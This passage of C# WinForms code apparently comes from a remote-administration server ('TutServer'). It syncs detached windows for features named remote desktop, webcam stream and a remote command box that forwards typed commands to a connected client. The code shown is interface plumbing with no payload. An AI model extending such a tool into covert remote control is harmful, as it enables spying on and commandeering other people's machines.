                        if (pref.Tag.ToString() == "rdesktop") Form1.rdRouteUpdate = pb.Tag.ToString();
                        if (pref.Tag.ToString() == "wcstream") Form1.wcRouteUpdate = pb.Tag.ToString();

                        route.Controls.Add(pb);

                        break;
                }
            }

            route.Show();
            route.FormClosing += new FormClosingEventHandler(onRouteDestroy);
            TutServer.Form1.routeWindow.Add(route);
            if (assignContextMenu != "")
            {
                Control acms = route.Controls.Find(assignContextMenu, false)[0];
                ContextMenuStrip copyCMS = new ContextMenuStrip();
                copyCMS.AutoSize = cloneCMS.AutoSize;
                copyCMS.Font = cloneCMS.Font;
                copyCMS.BackColor = cloneCMS.BackColor;
                copyCMS.ForeColor = cloneCMS.ForeColor;
                copyCMS.Name = cloneCMS.Name;
                copyCMS.Size = cloneCMS.Size;
                copyCMS.Text = cloneCMS.Text;

                foreach (ToolStripItem i in cloneCMS.Items)
                {
                    copyCMS.Items.Add(i.Text, i.Image, onClick);
                }
                int track = 0;
                foreach (ToolStripItem i in copyCMS.Items)
                {
                    i.BackColor = SystemColors.Window;
                    i.Name = cloneCMS.Items[track].Name;
                    track++;
                }

                //route.Controls.Add(copyCMS);
                acms.ContextMenuStrip = copyCMS;
            }

            Timer update = new Timer();
            update.Interval = 100; //prev. 1000
            update.Tick += new EventHandler(updateUI);
            currentRoute = route;
            update.Start();
        }

        private void onKeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Return && Form1.IsCmdStarted)
            {
                TextBox me = sender as TextBox;
                if (me.Tag.ToString().Split('.')[2] == "rcmd")
                {
                    String command = "cmd§" + me.Text;
                    me.Text = "";
                    Form1 f = new Form1();
                    f.loopSend(command);
                }
            }
            else if (e.KeyCode == Keys.Return && !Form1.IsCmdStarted)
            {
                MessageBox.Show(Form1.me, "Cmd Thread is not started!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private void onRouteDestroy(object sender, FormClosingEventArgs e)
        {
            Form dieRoute = (Form)sender;
            String dieRouteID = dieRoute.Text.Split('[')[1].Substring(0, 1);
            String rdUpdateID = Form1.rdRouteUpdate.Split('.')[0].Replace("route", "");
            String wcUpdateID = Form1.wcRouteUpdate.Split('.')[0].Replace("route", "");
            if (dieRouteID == rdUpdateID)
            {
                Form1.rdRouteUpdate = "route0.none";
            }
            if (dieRouteID == wcUpdateID)
            {
                Form1.wcRouteUpdate = "route0.none";
            }
            Form1.routeWindow.Remove(dieRoute);
            int exitPoint = int.Parse(dieRouteID) - 1;

            for (int i = exitPoint; i < Form1.routeWindow.Count; i++)
            {
                int currentRouteID = int.Parse(Form1.routeWindow[i].Text.Split('[')[1].Substring(0, 1));
                String textStart = Form1.routeWindow[i].Text.Split('[')[0];
                String textEnd = Form1.routeWindow[i].Text.Split('[')[1];
                textEnd = textEnd.Substring(1);
                textEnd = "[" + (currentRouteID - 1).ToString() + textEnd;
                Form1.routeWindow[i].Text = textStart + textEnd;
            }

            //Die :(
        }

        private void onItemChange(object sender, EventArgs e)
        {
            Control ctl = sender as Control;

            if (ctl.Name.StartsWith("comboBox"))
            {
                ComboBox cb = ctl as ComboBox;
                String slitem = cb.SelectedItem.ToString();
                Form1.setvalue.Add(cb.Name + "§" + slitem);
            }
        }

        private bool getignoreState(String name)
        {
            bool isIgnore = false;

            foreach (String pending in Form1.setvalue)
            {
                if (pending.Split('§')[0] == name)
                {
                    isIgnore = true;
                    break;
                }
            }

            return isIgnore;
        }

        private void onCheck(object sender, EventArgs e)
        {
            CheckBox cb = sender as CheckBox;
            bool check = cb.Checked;
            String name = cb.Name;
            Form1.setvalue.Add(name + "§" + check.ToString().ToLower());
        }

        private void onTextChange(object sender, EventArgs e)
        {
            Control t = sender as Control;
            String name = t.Name;
            String text = t.Text;
            if (disableWrite.Contains(name)) return;
            Form1.setvalue.Add(name + "§" + text);
        }

        private void onIndexChange(object sender, EventArgs e)
        {
            Console.WriteLine("index changed");
            //if (Form1.protectLv) return;
            /*if (Form1.rwriteLv == 1)
            {
                Form1.rwriteLv = 0;
                Console.WriteLine("Disable rwirteLV");
                return;
            }*/
            //if (Form1.rwriteLv == 1) Form1.rwriteLv++;
            String name = "";
            Control ctl = sender as Control;
            name = ctl.Name;
            if (ctl.Name.StartsWith("listView"))
            {
                ListView lv = ctl as ListView;
                int index = -1;
                if (lv.SelectedIndices.Count > 0) index = lv.SelectedIndices[0];
                if (index != -1)
                {
                    Console.WriteLine("setIndex: " + index.ToString());
                    Form1.setvalue.Add(name + "§" + index.ToString());
                }
            }
        }

        private void onClick(object sender, EventArgs e)
        {
            try
            {
                Control send = (Control)sender;
                int routeID = int.Parse(send.Parent.Text.Split('[')[1].Substring(0, 1));
                Form1.setFocusRouteID = routeID;
                Control remoteObj = page.Controls.Find(send.Name, false)[0];
                Button remoteButton = (Button)remoteObj;
                TabPage backup = Form1.selected;
                Form1.setPagebackup = backup;
                Form1.setvalue.Add("tabControl1§" + page.Name.Replace("tabPage", ""));
                Timer t = new Timer();
                t.Interval = 200;
                t.Tick += new EventHandler(waitForTabChange);
                Form1.rbutton = remoteButton;
                t.Start();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Routed Window button onclick error");
                //ToolStripItem
                ToolStripItem send = (ToolStripItem)sender;
                //MessageBox.Show(send.Name);
                Form1 parent = new Form1();
                
                parent.executeToolStrip(send.Name);
            }
        }

        private void waitForTabChange(object sender, EventArgs e)
        {
            if (Form1.setFocusBack == 1)
            {
                if (Form1.selected == page)
                {
                    Form1.rbutton.PerformClick();
                    Form1.rbutton = new Button();
                    Form1.setvalue.Add("tabControl1§" + Form1.setPagebackup.Name.Replace("tabPage", ""));
                    Form1.setFocusBack = 2;
                    return;
                }
            }

            if (Form1.setFocusBack == 2)
            {
                if (Form1.selected == Form1.setPagebackup)
                {
                    int ID = Form1.setFocusRouteID;
                    Form cRoute = Form1.routeWindow[ID - 1];
                    cRoute.BringToFront();
                    Timer me = (Timer)sender;
                    Form1.setFocusBack = 1;
                    Form1.setFocusRouteID = -1;
                    me.Stop();
                }
            }
        }

        private void updateUI(object sender, EventArgs e)
        {
            Control.ControlCollection controls = currentRoute.Controls;

            foreach (Control c in controls)
            {
                String name = c.Name;
                String type = getControlType(name);
                if (type == "") continue;
                if (getignoreState(name)) continue;
                switch (type)
                {
                    case "label":

                        Label l = (Label)c;
                        String lc = l.Text;
                        String lv = Form1.getValue(l.Name);

                        if (lv != lc)
                        {
                            l.Text = lv;
                        }

                        break;

                    case "button":

                        Button b = (Button)c;
                        String bc = b.Text;
                        String bv = Form1.getValue(b.Name);

                        if (bv != bc)
                        {
                            b.Text = bv;
                        }

                        break;

                    case "comboBox":

                        ComboBox cb = (ComboBox)c;
                        String iname = cb.SelectedItem.ToString();
                        String vname = new Form1().getSelectedItem(cb.Name);
                        if (iname != vname && !cb.DroppedDown)
                        {
                            cb.SelectedItem = vname;
                        }

                        break;

                    case "richTextBox":

                        RichTextBox rtb = (RichTextBox)c;
                        String rtbc = rtb.Text;
                        String rtbv = Form1.getValue(rtb.Name);

                        if (rtbv != rtbc)
                        {
                            disableWrite.Add(rtb.Name);
                            rtb.Text = rtbv;
                        }

                        break;

                    case "textBox":

                        TextBox tb = (TextBox)c;
                        String tbc = tb.Text;
                        String tbv = Form1.getValue(tb.Name);

                        if (tbv != tbc)
                        {
                            disableWrite.Add(tb.Name);
                            tb.Text = tbv;
                        }

                        break;

                    case "listView":

                        //Check items

                        ListView liv = (ListView)c;
                        List<String> myItems = new List<String>();

                        foreach (ListViewItem lvi in liv.Items)
                        {
                            String emt = "";
                            int sindex = lvi.SubItems.Count;
                            int count = 0;
                            foreach (ListViewItem.ListViewSubItem si in lvi.SubItems)
                            {
                                if (si.Text == "")
                                {
                                    count++;
                                    continue;
                                }

                                if (count < sindex)
                                {
                                    emt += si.Text + "|";
                                }
                                else
                                {
                                    emt += si.Text;
                                }

                                //Console.WriteLine("GET Emt: " + emt);

                                count++;
                            }
                            myItems.Add(emt);
                        }

                        String[] ritems = new Form1().getItems(liv.Name, "items");
                        bool editItems = false;

                        if (myItems.Count == ritems.Length)
                        {
                            for (int i = 0; i < ritems.Length; i++)
                            {
                                String validate1 = ritems[i];
                                String validate2 = myItems[i];

                                //Console.WriteLine("VALIDATE\n   Remote: " + validate1 + "\n     generated: " + validate2);

                                if (validate1 != validate2)
                                {
                                    Console.WriteLine("INVALID \n " + validate1 + "\n " + validate2);
                                    editItems = true;
                                    break;
                                }
                            }
                        }
                        else
                        {
                            editItems = true;
                        }

                        if (editItems)
                        {
                            //MessageBox.Show("edit");
                            liv.Items.Clear();
                            foreach (String item in ritems)
                            {
                                ListViewItem add = new ListViewItem(item.Split('|')[0]);
                                int track = 0;
                                foreach (String sitem in item.Split('|'))
                                {
                                    if (track == 0)
                                    {
                                        track++;
                                        continue;
                                    }

                                    add.SubItems.Add(sitem);

                                    track++;
                                }
                                liv.Items.Add(add);
                            }
                        }

                        //checkSelect
                        
                        String selected = new Form1().getItems(liv.Name, "selected")[0];
                        if (selected != "-1" && !Form1.protectLv)
                        {
                            Form1.rwriteLv = 1;

                            if (liv.SelectedIndices.Count > 0)
                            {
                                if (liv.SelectedIndices[0] != int.Parse(selected))
                                {
                                    liv.Items[liv.SelectedIndices[0]].Selected = false;
                                    liv.Items[int.Parse(selected)].Selected = true;
                                }
                            }
                            else
                            {
                                liv.Items[int.Parse(selected)].Selected = true;
                            }
                        }


                        break;

                    case "checkBox":

                        CheckBox cx = (CheckBox)c;
                        bool xbc = cx.Checked;
                        bool xbv = new Form1().getChecked(cx.Name);

                        if (xbv != xbc)
                        {
                            cx.Checked = xbv;
                        }

                        break;
                }
            }

            disableWrite.Clear();
        }

        private String getControlType(String name)
        {
            String type = "";

            for (int i = 0; i < name.Length; i++)
            {
                if (char.IsNumber(name, i))
                {
                    break;
                }
                type += name[i];
            }

            return type;
        }
    }
}
